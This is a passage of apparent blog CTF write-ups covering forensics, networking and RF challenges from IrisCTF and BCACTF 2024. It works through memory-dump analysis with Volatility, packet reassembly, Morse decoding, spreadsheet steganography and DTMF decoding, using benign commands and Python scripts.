we got to our beloved volatility for the analysis. Initial AnalysisI started analyzing the memdump.mem using Volatility3. The first step was as always listing the processes. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576w0lf@hp:~/volatility3$ python3 vol.py -f memdump.mem windows.pslistVolatility 3 Framework 2.6.1Progress: 100.00 PDB scanning finishedPID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output4 0 System 0xe38cb727f6c0 98 - N/A False 2025-01-03 16:50:11.000000 N/A Disabled260 4 smss.exe 0xe38cb79de040 2 - N/A False 2025-01-03 16:50:11.000000 N/A Disabled364 356 csrss.exe 0xe38cb7aa2440 9 - 0 False 2025-01-03 16:50:12.000000 N/A Disabled428 260 smss.exe 0xe38cb7d79380 0 - 1 False 2025-01-03 16:50:12.000000 2025-01-03 16:50:12.000000 Disabled436 428 csrss.exe 0xe38cb7d95340 11 - 1 False 2025-01-03 16:50:12.000000 N/A Disabled444 356 wininit.exe 0xe38cb7d9a080 1 - 0 False 2025-01-03 16:50:12.000000 N/A Disabled488 428 winlogon.exe 0xe38cb7980080 4 - 1 False 2025-01-03 16:50:12.000000 N/A Disabled548 444 services.exe 0xe38cb7f8c080 5 - 0 False 2025-01-03 16:50:13.000000 N/A Disabled556 444 lsass.exe 0xe38cb7f89080 7 - 0 False 2025-01-03 16:50:13.000000 N/A Disabled628 548 svchost.exe 0xe38cb7fdc4c0 17 - 0 False 2025-01-03 16:50:13.000000 N/A Disabled672 548 svchost.exe 0xe38cb83ed180 10 - 0 False 2025-01-03 16:50:13.000000 N/A Disabled780 488 dwm.exe 0xe38cbae30080 12 - 1 False 2025-01-03 16:50:13.000000 N/A Disabled888 548 svchost.exe 0xe38cbaeac500 46 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled896 548 svchost.exe 0xe38cbaeb8340 19 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled904 548 svchost.exe 0xe38cbaebd800 23 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled948 548 svchost.exe 0xe38cbaee1800 12 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled964 548 svchost.exe 0xe38cbaeea800 18 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled624 548 svchost.exe 0xe38cbaf45800 24 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled1076 548 svchost.exe 0xe38cb82032c0 20 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled1132 548 svchost.exe 0xe38cb824f800 6 - 0 False 2025-01-03 16:50:14.000000 N/A Disabled1360 548 svchost.exe 0xe38cb82eb080 6 - 0 False 2025-01-03 16:50:15.000000 N/A Disabled1696 548 svchost.exe 0xe38cb83d3800 11 - 0 False 2025-01-03 16:50:16.000000 N/A Disabled1776 548 svchost.exe 0xe38cb8006800 5 - 0 False 2025-01-03 16:50:16.000000 N/A Disabled1784 548 svchost.exe 0xe38cb800f800 9 - 0 False 2025-01-03 16:50:16.000000 N/A Disabled1832 548 MsMpEng.exe 0xe38cb83e6340 27 - 0 False 2025-01-03 16:50:16.000000 N/A Disabled2676 548 NisSrv.exe 0xe38cbb0bf800 3 - 0 False 2025-01-03 16:50:23.000000 N/A Disabled2144 628 RuntimeBroker. 0xe38cb81a2080 12 - 1 False 2025-01-03 16:50:59.000000 N/A Disabled2208 548 svchost.exe 0xe38cbb1de080 7 - 1 False 2025-01-03 16:51:00.000000 N/A Disabled2220 888 sihost.exe 0xe38cbb1f8800 10 - 1 False 2025-01-03 16:51:00.000000 N/A Disabled2276 888 taskhostw.exe 0xe38cb8140080 11 - 1 False 2025-01-03 16:51:00.000000 N/A Disabled2592 488 userinit.exe 0xe38cbb202080 0 - 1 False 2025-01-03 16:51:01.000000 2025-01-03 16:51:31.000000 Disabled2856 2592 explorer.exe 0xe38cbb239800 70 - 1 False 2025-01-03 16:51:01.000000 N/A Disabled2064 628 ShellExperienc 0xe38cbb2a4800 28 - 1 False 2025-01-03 16:51:03.000000 N/A Disabled2216 628 SearchUI.exe 0xe38cbb2e3800 16 - 1 False 2025-01-03 16:51:04.000000 N/A Disabled3248 2312 ServerManager. 0xe38cbb3d3800 13 - 1 False 2025-01-03 16:51:06.000000 N/A Disabled3472 628 dllhost.exe 0xe38cb75b3340 2 - 1 False 2025-01-03 16:52:20.000000 N/A Disabled3464 548 msdtc.exe 0xe38cb75c7800 9 - 0 False 2025-01-03 16:52:21.000000 N/A Disabled1604 488 fontdrvhost.ex 0xe38cb75d8080 5 - 1 False 2025-01-03 16:54:00.000000 N/A Disabled3036 4060 firefox.exe 0xe38cb818b500 89 - 1 True 2025-01-03 16:55:40.000000 N/A Disabled3968 3036 firefox.exe 0xe38cb75b9080 22 - 1 True 2025-01-03 16:55:41.000000 N/A Disabled3624 3036 firefox.exe 0xe38cbb380080 5 - 1 True 2025-01-03 16:55:41.000000 N/A Disabled3828 3036 firefox.exe 0xe38cbb539800 17 - 1 True 2025-01-03 16:55:43.000000 N/A Disabled2420 3036 firefox.exe 0xe38cbb711800 5 - 1 True 2025-01-03 16:55:44.000000 N/A Disabled4076 3036 firefox.exe 0xe38cbb116080 17 - 1 True 2025-01-03 16:55:45.000000 N/A Disabled3132 3036 firefox.exe 0xe38cbb1e1080 5 - 1 True 2025-01-03 16:55:47.000000 N/A Disabled712 628 ApplicationFra 0xe38cbb573080 1 - 1 False 2025-01-03 16:56:02.000000 N/A Disabled5044 3036 firefox.exe 0xe38cbb7c8800 5 - 1 True 2025-01-03 16:56:43.000000 N/A Disabled4772 3036 firefox.exe 0xe38cbb0d6300 18 - 1 True 2025-01-03 16:57:38.000000 N/A Disabled1380 2856 FTK Imager.exe 0xe38cbb82e800 20 - 1 False 2025-01-03 17:02:19.000000 N/A Disabled5324 3036 firefox.exe 0xe38cbba94080 19 - 1 True 2025-01-03 17:09:52.000000 N/A Disabled5804 3036 firefox.exe 0xe38cbb261080 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled2308 3036 firefox.exe 0xe38cbbb44080 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled2712 3036 firefox.exe 0xe38cbba16080 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled3328 3036 firefox.exe 0xe38cbb8c6800 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled6256 3036 firefox.exe 0xe38cbb884800 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled5288 3036 firefox.exe 0xe38cbb8a9800 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled5664 3036 firefox.exe 0xe38cbb7c9080 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled5196 3036 firefox.exe 0xe38cbb8c0800 19 - 1 True 2025-01-03 17:09:56.000000 N/A Disabled4508 3036 firefox.exe 0xe38cbbbe8800 19 - 1 True 2025-01-03 17:09:59.000000 N/A Disabled4344 3036 firefox.exe 0xe38cbbbb8080 19 - 1 True 2025-01-03 17:10:00.000000 N/A Disabled928 3036 firefox.exe 0xe38cbbc8c080 19 - 1 True 2025-01-03 17:10:00.000000 N/A Disabled740 3036 firefox.exe 0xe38cbb89e400 19 - 1 True 2025-01-03 17:10:01.000000 N/A Disabled2252 3036 firefox.exe 0xe38cb7e25080 19 - 1 True 2025-01-03 17:10:01.000000 N/A Disabled2920 3036 firefox.exe 0xe38cbbc9e080 19 - 1 True 2025-01-03 17:10:01.000000 N/A Disabled3124 3036 firefox.exe 0xe38cbbca0080 19 - 1 True 2025-01-03 17:10:01.000000 N/A Disabled7116 3036 firefox.exe 0xe38cb7e32680 19 - 1 True 2025-01-03 17:10:01.000000 N/A Disabled6344 628 smartscreen.ex 0xe38cbbcd9080 13 - 1 False 2025-01-03 17:10:06.000000 N/A Disabled7292 7052 MpCmdRun.exe 0xe38cbbad5800 5 - 0 False 2025-01-03 17:10:10.000000 N/A Disabled8136 8112 Taskmgr.exe 0xe38cbb713800 15 - 1 False 2025-01-03 17:10:50.000000 N/A Disabled4124 628 WmiPrvSE.exe 0xe38cbba9e800 10 - 0 False 2025-01-03 17:11:13.000000 N/A Disabled5628 628 WmiPrvSE.exe 0xe38cb7d80080 9 - 0 False 2025-01-03 17:11:13.000000 N/A Disabled This tells us that at the time of memory capture firefox.exe had been running and also since it only happens to be any process to concern, so the next step was to dump the memory of the proces firefox.exe (PID: 3036) 1$python3 vol.py -f memdump.mem windows.memmap --pid 3036 --dump Now I had my firefox process dump and since its a browser so the most sensible thing to search for was URLs but that happened to be too many so now it was just some trial and error until we get the result that it was a google URL that happened to encode our flag in base64. 1234...https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D. Decoding our Flag12$echo &quot;aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=&quot; | base64 -dirisctf&#123;i_am_an_idiot_with_bad_memory&#125; Flag: 1irisctf&#123;i_am_an_idiot_with_bad_memory&#125; Cheesy ApproachAfter the CTF ended the discussion led to the revelation that just the string search the base64 encoding of irisct could yield this URL and hence the flag as well. 123456789101112131415w0lf@hp:~/volatility3$ strings memdump.mem | grep aXJpc2N0https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Zhttps://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2lhttps://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Zhttps://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2Fhttps://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0Znhttps://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZnO^firstPartyDomain=google-b-d.search.suggestions.mozilla,a,::https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2..client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3Dclient=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D... NetworkingNo Shark?Challenge Description Source File: noshark.tar.gz SolutionWe received a text file for this challenge which contained some hex encoded data that on initial inspection on cyberchef, happened to be a tcp packet data file. On analysing the initial data streams, the first lengthy stream happened to catch my eye with JFIF magic bytes being evidently present which made me believe these are the data packets of a TCP file transfer stream wherein a .jpeg file was sent and hopefully that should contain our flag as well. Constructing the imageWe can write a simple python script to do the task i.e. remove the first 64 bytes of all data that correspond to tcp headers and hence happen to be same alternatively, and just take and concat the payload bytes to a new file. 12345678910111213input_file_path = &quot;noshark.txt&quot;output_file_path = &quot;output.jpg&quot;with open(input_file_path, &quot;r&quot;) as input_file, open(output_file_path, &quot;wb&quot;) as output_file: hex_data = &#x27;&#x27; for line in input_file: processed_line = line.strip() hex_data += processed_line[132:] trimmed_data = hex_data[32:] decoded_data = bytes.fromhex(trimmed_data) output_file.write(decoded_data)print(f&quot;Data has been successfully processed and saved to &#123;output_file_path&#125;.&quot;) Flag: 1irisctf&#123;welcome_to_net_its_still_ez_to_read_caps_without_wireshark&#125; RFdotdotdotChallenge Description Source File: dotdotdot.tar.gz SolutionWe are given a .iq file, which are standard RF signal files, so the first step was to convert it to corresponding .wav file which can be easily done using the following command. 1sox -e float -t raw -r 192000 -b 32 -c 2 dotdotdot.iq -t wav -e float -b 32 -c 2 -r 192000 output.wav Once we have the data as the wav file, the first thing to inspect was obviously the spectrogram and once we do so, we immediately observe a morse codee present at one of the frequencies. Constructing the FlagNow it would have been ideal to apply a low pass filter to make the morse more predominant and then use audio morse decoder but I just went on with manual decoding of the morse using a morse conversion sheet. Flag: 1irisctf&#123;n01s3_g0t_n0th1ng_0n_my_m0rse&#125;","tags":[{"name":"Forensics","slug":"Forensics","permalink":"http://w1r3w01f.github.io/tags/Forensics/"},{"name":"Wireshark","slug":"Wireshark","permalink":"http://w1r3w01f.github.io/tags/Wireshark/"},{"name":"Volatility","slug":"Volatility","permalink":"http://w1r3w01f.github.io/tags/Volatility/"}],"categories":[{"name":"CTF-Writeups","slug":"CTF-Writeups","permalink":"http://w1r3w01f.github.io/categories/CTF-Writeups/"}]},{"title":"BCACTF 5.0 2024","date":"2024-06-11T18:30:00.000Z","path":"2024/06/12/BCACTF-5-0-2024/","text":"I participated in BCACTF 2024, as a core member of the team InfoSecIITR. Our team secured 7th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. Forensics&#x2F;23-719-writeupChallenge DescriptionWe are given a pdf along with the following description: That’s a nice unanimous supreme court decision you’ve made public, sure would be a shame if someone didn’t properly clean up remnants of a prior version of the document before publishing it. SolutionThe solution was pretty straight forward we just find for the initials of the flag i.e. bacactf and highlight some of the text So we select that text and paste it in a text editor and we reveal the flag : So our flag becomes -&gt; bcactf&#123;rEAl_WOrLd_appLIc4t1ons_Of_cTf_ad04cc78601d5da8&#125; ……………………………………………………….. Forensics&#x2F;sheep-writeupChallenge DescriptionWe are given a .shp along with the following hint: Figure out what type of file it is and see if there are tools you can use or modify. SolutionUpon some research we find out that .shp are ESRI shapefiles used in GIS softwares like Google Earth Pro but such softwares require 3 of such files as mandatory which are a .shp, .shx and a .dbf file which work complementorily to produce the geographical data but some more reserach yielded this software that can standalone process a .shp file (https://softradar.com/shp-viewer/). So we just load our sheep.shp in the software and thats it we get the flag : So our flag becomes -&gt; bcactf&#123;SHaPE_f1lEd_b54a11ac9c87c8&#125; …………………………………………………………. Forensics&#x2F;Manipulate Spreadsheet 2-writeupChallenge DescriptionWe are given an excel file for this challenge: SolutionThe first that we notice is this long string written in the A1 cell of the excel sheet. The hex decode of this string reveals the following hint: In digital fields where data lies, Secret pages beneath clear skies. Cells entwine, mysteries feel, Layers of secrets they reveal. The layers part hint that there maybe a hidden sheet in this file and exactly that happens to be the case we unhide the sheet 2 of this excel file and there we find some bytes and index data along with another hint in the A1 cell of the sheet The hex decode of this hint reveals: Lurking shadows, secrets play, Stealthy whispers on display. BITS aligned, LEAST in SIGht, Gleams of secrets, veiled in light. This reveals that we have to arrange the bytes in order of indices and then do LSB extract of the bytes so we do that and we get our flag as: bcactf&#123;600D_job_Using_900G13_SHe3t5&#125; ………………………………………………….. Forensics&#x2F;Touch Tone Telephone-writeupChallenge DescriptionWe are given a .wav along with the following hints: -DTMF is a really cool technology -There also used to be A, B, C, and D menu selection keys -How many keys are there in total? Is it a computer science-y number? -For key to number, Start at top left, reading order. (Sorry, 0 is not 0, my bad) SolutionBased on the hints the course of action gets pretty much cleared that we need to extract the dtmf tones of our wav file then perform a little substitution of keys before finally hex decoding the message. Now there are many online tools to detect the dtmf tones of a wav file but I used the CLI tool multimon-ng which gives us a result for the detected dtmf tones as 47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA43B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BBD4648 But due to the speed of the wav file some of the dtmf tones get overlapped in this result and doing some manual patching of this result we get the final dtmf tones as : 47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648 Then we do the keys substituition as replacing 123A456B789C*0#D by 0123456789ABCDEF and print the hex decoded value using python. 123456789101112input_string = &quot;xpdReWEfno4BtvReUHxu8tBrknyUh128DolsWh1oz7cnUDygIxkCItws05vN8SdkFpTPRvVNUcRTtoS7zEUaf7ONI3n0UtVuIli9BcPfxECYmDI_4E3rJAUhYGV9wOFI&quot;hex_indices = [ 0x61, 0x72, 0x6c, 0x38, 0x2b, 0x6f, 0x3e, 0x59, 0x6c, 0x38, 0x19, 0x6f, 0x1d, 0x72, 0x0a, 0x45, 0x59, 0x6f, 0x6c, 0x2e, 0x6f, 0x6c, 0x26, 0x2b, 0x02, 0x6f, 0x01, 0x26, 0x72, 0x53, 0x39, 0x04]resultant_string = &#x27;&#x27;.join(input_string[index] for index in hex_indices)print(resultant_string) Then we get the following message: Now comes the part to reverse this code so we write another code to solve this task which extract the characters of the flag based on the given indices of the garbage given in the end. 123456789101112mapping = &#123; &#x27;1&#x27;: &#x27;0&#x27;, &#x27;2&#x27;: &#x27;1&#x27;, &#x27;3&#x27;: &#x27;2&#x27;, &#x27;A&#x27;: &#x27;3&#x27;, &#x27;4&#x27;: &#x27;4&#x27;, &#x27;5&#x27;: &#x27;5&#x27;, &#x27;6&#x27;: &#x27;6&#x27;, &#x27;B&#x27;: &#x27;7&#x27;, &#x27;7&#x27;: &#x27;8&#x27;, &#x27;8&#x27;: &#x27;9&#x27;, &#x27;9&#x27;: &#x27;A&#x27;, &#x27;C&#x27;: &#x27;B&#x27;, &#x27;*&#x27;: &#x27;C&#x27;, &#x27;0&#x27;: &#x27;D&#x27;, &#x27;#&#x27;: &#x27;E&#x27;, &#x27;D&#x27;: &#x27;F&#x27;&#125;encoded_str = (&quot;47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA443B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BB4D4648&quot;)decoded_str = &#x27;&#x27;.join(mapping.get(char, char) for char in encoded_str)bytes_obj = bytes.fromhex(decoded_str)result_string = bytes_obj.decode(&quot;utf-8&quot;)print(result_string) And that reveals us our flag: bcactf&#123;l3m0n_d3m0n_134v3_my_m1nd_p13a5e&#125;","tags":[{"name":"Forensics","slug":"Forensics","permalink":"http://w1r3w01f.github.io/tags/Forensics/"}],"categories":[{"name":"CTF-Writeups","slug":"CTF-Writeups","permalink":"http://w1r3w01f.github.io/categories/CTF-Writeups/"}]}]